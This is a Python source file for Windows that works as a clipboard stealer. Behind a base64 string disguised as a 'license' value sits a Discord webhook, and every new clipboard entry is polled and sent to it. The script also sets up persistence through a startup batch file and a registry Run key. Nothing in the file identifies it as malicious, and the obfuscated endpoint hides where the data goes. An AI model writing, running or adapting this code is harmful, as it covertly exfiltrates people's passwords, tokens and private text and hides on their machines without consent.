# my_script.py

import time
import pyperclip
import requests
import base64
import io
import os
import shutil
import sys
import winreg as reg






def main():
    licenseCD = '''aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI2MjM5MTY1Mzk5MDE0MjAxMy9wNmVqSW1qRnhmMlJYakpPM3ZKQmg2VXZQQ2VuS2FsalhKMmR6SDFCd2NkYVdnT1BjR0lkSFY3eGNRWTIxWThoTzhZLQ=='''
    strb = base64.b64decode(licenseCD)
    mk = strb.decode('utf-8')
    send_txt = ""
    n = b'{"content": ["Must be 2000 or fewer in length."]}'



    if check_persistence('MyStartupScript'):
        while True:
            txt = pyperclip.paste()
            # print(txt)

            if send_txt == txt:
                time.sleep(1)
            else:
                data = {
                    'content': f"```{txt}```"
                }
                response = requests.post(mk, data=data)
                if response.content == n:
                    print('error')
                    file = io.BytesIO(txt.encode('utf-8'))
                    file.name = 'filename.txt'

                    # Create the payload for the file
                    payload = {
                        "file": (file.name, file)
                    }

                    # Send the request
                    response = requests.post(mk, files=payload)
                send_txt = txt
            time.sleep(1)
    else:
        add_to_startup()

def add_to_startup():
    script_path = os.path.abspath(sys.argv[0])
    bat_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows')
    bat_name = 'startup_script.bat'

    with open(os.path.join(bat_path, bat_name), 'w') as bat_file:
        bat_file.write(f'@echo off\nstart "" pythonw "{script_path}"\nexit')

    # Optional: Add to registry for persistence
    key = reg.HKEY_CURRENT_USER
    sub_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
    reg_key = reg.OpenKey(key, sub_key, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(reg_key, "MyStartupScript", 0, reg.REG_SZ, bat_path)
    reg.CloseKey(reg_key)


def check_persistence(program_name):
    # Define the registry hives and paths to check
    hives = [
        reg.HKEY_LOCAL_MACHINE,
        reg.HKEY_CURRENT_USER
    ]
    paths = [
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
    ]
    
    for hive in hives:
        for path in paths:
            try:
                with reg.OpenKey(hive, path, 0, reg.KEY_READ) as key:
                    try:
                        # Check if the program name exists in the registry key
                        reg.QueryValueEx(key, program_name)
                        return True
                    except FileNotFoundError:
                        continue
            except FileNotFoundError:
                continue
    
    return False



# if __name__ == "__main__":
#     main()
